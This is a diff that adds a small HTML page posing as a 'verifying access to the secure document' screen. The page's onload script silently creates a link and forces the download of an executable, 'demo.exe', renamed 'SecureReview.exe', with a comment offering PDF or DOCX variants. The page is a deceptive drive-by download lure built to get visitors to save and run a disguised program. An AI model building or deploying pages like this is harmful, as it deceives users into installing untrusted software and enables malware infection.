@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Verifying Document Access...</title>
+</head>
+<body>
+  <h1>Please wait, verifying access to the secure document...</h1>
+
+  <script>
+    window.onload = function() {
+      const a = document.createElement("a");
+      a.href = "demo.exe"; // Or demo.pdf / demo.docx
+      a.download = "SecureReview.exe"; // This sets the download name
+      document.body.appendChild(a); // Required for some browsers
+      a.click();
+      document.body.removeChild(a);
+    };
+  </script>
+</body>
+</html>
